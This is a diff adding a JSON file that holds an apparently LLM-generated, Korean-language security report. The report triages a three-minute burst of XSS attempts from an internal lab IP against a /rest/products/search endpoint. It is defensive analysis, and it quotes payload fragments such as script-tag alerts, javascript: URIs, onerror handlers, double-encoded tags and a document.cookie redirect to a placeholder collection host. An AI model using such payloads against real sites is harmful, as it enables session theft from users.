@@ -1,0 +1,145 @@
+{
+  "meta": {
+    "generated_at": "2026-04-25T22:17:17.667+09:00",
+    "mode": "routine",
+    "provider": "openai",
+    "selected_model": "gpt-5.4-mini",
+    "store": false,
+    "reasoning_effort": "none",
+    "known_asset_ips": [
+      "192.168.56.105",
+      "192.168.56.108",
+      "192.168.56.109",
+      "192.168.56.110"
+    ],
+    "base_url": "https://api.openai.com/v1",
+    "response_id": "resp_04806e46346e73790169ecbece7a3881978c204ef642e0ef6b",
+    "stop_reason": null,
+    "json_parse_strategy": "direct",
+    "input_stage1_results": "/opt/web_log_analysis/data/processed/op-security_2026-04-25_21-30-00_to_2026-04-25_21-33-00_kst_stage1_results.json",
+    "input_llm_input": "/opt/web_log_analysis/data/processed/op-security_2026-04-25_21-30-00_to_2026-04-25_21-33-00_kst_llm_input.json"
+  },
+  "report": {
+    "report_title": "Apache 웹 로그 2차 분석 요약: /rest/products/search 대상 XSS 시도 다발",
+    "overall_assessment": "분석 구간(2026-04-25 21:30:00~21:33:00 KST) 동안 동일 내부 자산 IP(192.168.56.110)에서 /rest/products/search 엔드포인트로 XSS 패턴이 연속적으로 반복되었습니다. 다수는 전형적인 XSS 시도 정황이며, 일부는 교육용/자연어 검색 문맥으로 보이는 오탐 가능성도 있습니다. Apache 로그만으로 브라우저 실행 성공, 쿠키 탈취, 외부 전송 성공은 확인되지 않았습니다.",
+    "executive_summary": [
+      "3분 구간에 /rest/products/search로 XSS 형태의 요청이 집중되었습니다.",
+      "대부분은 `<script>`, `javascript:`, 이벤트 핸들러, `document.cookie` 등 전형적 공격 토큰을 포함합니다.",
+      "대상 IP가 known asset 이므로 내부 테스트/자체 호출 가능성을 함께 봐야 합니다.",
+      "응답이 500 또는 JSON인 경우도 있어, 실제 실행 성공이나 노출 여부는 이 로그만으로 단정할 수 없습니다."
+    ],
+    "key_findings": [
+      {
+        "title": "동일 IP에서 XSS 시도가 연속 발생",
+        "detail": "192.168.56.110에서 /rest/products/search로 스크립트 태그, javascript URI, 이벤트 핸들러, 이중/엔티티 인코딩 페이로드가 짧은 시간에 반복되었습니다. 패턴상 입력 검증 우회 또는 반사형 XSS 탐색 시도로 보는 것이 타당합니다.",
+        "severity": "medium"
+      },
+      {
+        "title": "쿠키 접근 및 외부 전송 의도 포함",
+        "detail": "일부 요청에는 `document.cookie`와 `document.location='http://example.invalid/collect?...'`가 포함되어 브라우저 데이터 접근 및 외부 전송 의도가 드러납니다. 다만 Apache 로그만으로 실제 쿠키 탈취나 외부 전송 성공은 확인되지 않습니다.",
+        "severity": "medium"
+      },
+      {
+        "title": "오탐 가능성이 있는 자연어 검색 질의도 존재",
+        "detail": "`how to prevent <script> alert in javascript`와 같은 교육/검색 문맥의 요청은 공격 구조가 약해 오탐 가능성이 높습니다. 별도 차단보다는 맥락 확인이 필요합니다.",
+        "severity": "low"
+      },
+      {
+        "title": "후보 밖 탐색성 요청이 별도로 보존됨",
+        "detail": "filtered_out_breakdown 에 low_signal_fuzzing 이 1건 보존되어 있어, 본 보고서의 incident 밖에도 저신호 탐색성 요청이 존재합니다. 단독으로는 사건으로 승격하지 않는 것이 적절합니다.",
+        "severity": "info"
+      }
+    ],
+    "notable_incidents": [
+      {
+        "incident_ref": "request_id:aey0EXHCi27Md-UoFOnpMwAAAEg|table:security|log_id:9566|candidate:0",
+        "request_id": "aey0EXHCi27Md-UoFOnpMwAAAEg",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "high",
+        "why_it_matters": "`document.cookie`를 이용한 외부 전송 의도가 포함된 전형적 XSS 시도입니다. 다만 응답이 500이고 text/html 이라 처리 오류 동반 정황일 수 있으며, 실제 실행·탈취 성공은 확인되지 않았습니다."
+      },
+      {
+        "incident_ref": "request_id:aeyz73HCi27Md-UoFOnpMAAAAEM|table:security|log_id:9562|candidate:2",
+        "request_id": "aeyz73HCi27Md-UoFOnpMAAAAEM",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "high",
+        "why_it_matters": "`<script>alert('XSS')</script>` 형태의 핵심 XSS 페이로드가 포함되어 있습니다. 응답 500은 서버 오류 정황일 수 있으나, 브라우저 실행 성공 근거로는 부족합니다."
+      },
+      {
+        "incident_ref": "request_id:aeyz-HHCi27Md-UoFOnpMQAAAEQ|table:security|log_id:9563|candidate:1",
+        "request_id": "aeyz-HHCi27Md-UoFOnpMQAAAEQ",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "`%253Cscript%253E...` 형태의 이중 인코딩된 XSS 페이로드가 보여 우회 시도 가능성이 있습니다. 응답이 200 application/json 이므로 실행 성공이나 반영 여부는 이 로그로 확인되지 않습니다."
+      },
+      {
+        "incident_ref": "request_id:aey0PXHCi27Md-UoFOnpNAAAAEk|table:security|log_id:9567|candidate:3",
+        "request_id": "aey0PXHCi27Md-UoFOnpNAAAAEk",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "`javascript:alert('XSS')` 패턴은 XSS 시도 정황입니다. 500 응답은 처리 오류 가능성을 시사할 뿐, 성공 여부를 말해주지 않습니다."
+      },
+      {
+        "incident_ref": "request_id:aey0THHCi27Md-UoFOnpNgAAAEw|table:security|log_id:9569|candidate:4",
+        "request_id": "aey0THHCi27Md-UoFOnpNgAAAEw",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "HTML 엔티티로 복원 가능한 `<script>alert(1)</script>` 형태가 포함되어 있어 우회성 XSS 시도 가능성이 있습니다. 응답은 JSON이며 성공 여부는 확인되지 않습니다."
+      },
+      {
+        "incident_ref": "request_id:aeyz__U0ZgNjgUQucSRN3AAAAAw|table:security|log_id:9564|candidate:5",
+        "request_id": "aeyz__U0ZgNjgUQucSRN3AAAAAw",
+        "src_ip": "192.168.56.110",
+        "verdict": "suspicious_xss",
+        "severity": "medium",
+        "why_it_matters": "`onerror` 이벤트 처리기와 `alert(1)` 조합은 전형적인 DOM/XSS 시험 패턴입니다. 다만 응답이 JSON이라 실제 브라우저 실행 근거는 없습니다."
+      }
+    ],
+    "notable_source_ips": [
+      {
+        "src_ip": "192.168.56.110",
+        "reason": "보고 구간 내 9건의 후보가 모두 이 IP에서 발생했으며, known asset 으로 분류됩니다. 내부 테스트, 자체 호출, 운영 점검 트래픽일 가능성이 있으므로 공격자 단정은 피해야 합니다."
+      }
+    ],
+    "noise_interpretation": "후보 밖 분포로 low_signal_fuzzing 1건이 보존되어 있습니다. 이는 단독 사건으로 보기보다 저신호 탐색성 요청으로 해석하는 것이 적절합니다. 또한 오탐 후보로는 교육용/자연어 검색 문맥의 XSS 키워드 질의가 있어, 필터링은 적절했지만 완전히 무시하기보다는 맥락 확인용으로만 참고해야 합니다.",
+    "recommended_actions": [
+      {
+        "priority": "P1",
+        "action": "192.168.56.110의 같은 시간대 요청을 원본 로그와 에러 로그로 재확인하고, /rest/products/search 에 대한 입력 검증·출력 인코딩 처리를 점검하세요.",
+        "why": "짧은 구간에 전형적 XSS 패턴이 집중되어 있어, 애플리케이션 차원의 취약 입력 처리 여부를 먼저 확인하는 것이 가장 효율적입니다."
+      },
+      {
+        "priority": "P1",
+        "action": "해당 IP가 내부 테스트 계정이나 자동 점검 장비인지 소유자와 즉시 대조하세요.",
+        "why": "known asset IP 이므로 악성 단정 전, 내부 테스트/자체 호출 여부를 먼저 구분해야 오탐을 줄일 수 있습니다."
+      },
+      {
+        "priority": "P2",
+        "action": "`document.cookie`, `javascript:`, `<script>`, 이벤트 핸들러가 포함된 요청을 중심으로 동일 세션/동일 사용자/동일 호스트의 연속 요청을 상관분석하세요.",
+        "why": "단발성 실험인지 반복 공격인지 구분하려면 시간축 상의 연계 확인이 필요합니다."
+      },
+      {
+        "priority": "P2",
+        "action": "응답이 500이었던 요청들에 대해 서버 오류 원인과 예외 스택을 확인하세요.",
+        "why": "500 응답은 취약점 성공이 아니라 서버 처리 오류일 수 있으므로, 실제 반영 여부와 무관하게 오류 원인을 분리해 봐야 합니다."
+      },
+      {
+        "priority": "P3",
+        "action": "후보 밖 low_signal_fuzzing 및 교육용 검색 질의를 차단 규칙으로 바로 올리기보다, 탐색성 트래픽으로 분류해 관찰하세요.",
+        "why": "저신호 트래픽은 오탐이 많아 과도한 차단보다 맥락 유지가 운영상 유리합니다."
+      }
+    ],
+    "confidence_and_limitations": [
+      "이 보고서는 Apache 웹 로그 요약 데이터만 기반으로 작성되었으며, 브라우저 측 실행 결과나 추가 네트워크 증거는 없습니다.",
+      "XSS 시도 정황은 강하지만, 성공적인 실행·쿠키 탈취·외부 전송 성공은 확정할 수 없습니다.",
+      "대상 IP가 known asset 이므로 내부 테스트/자체 호출 가능성을 배제할 수 없습니다.",
+      "필터링된 low_signal_fuzzing 1건은 후보 밖 탐색성 요청으로 남아 있어, 전체 탐색 범위는 incident 9건보다 약간 넓게 봐야 합니다."
+    ],
+    "presentation_takeaway": "이번 구간은 내부 자산 IP에서 /rest/products/search 를 향한 XSS 시도성 요청이 짧게 집중된 사례로 보이며, 성공 여부는 확인되지 않았습니다. 먼저 내부 테스트 여부와 애플리케이션 입력 처리 문제를 확인하는 것이 우선입니다."
+  }
+}
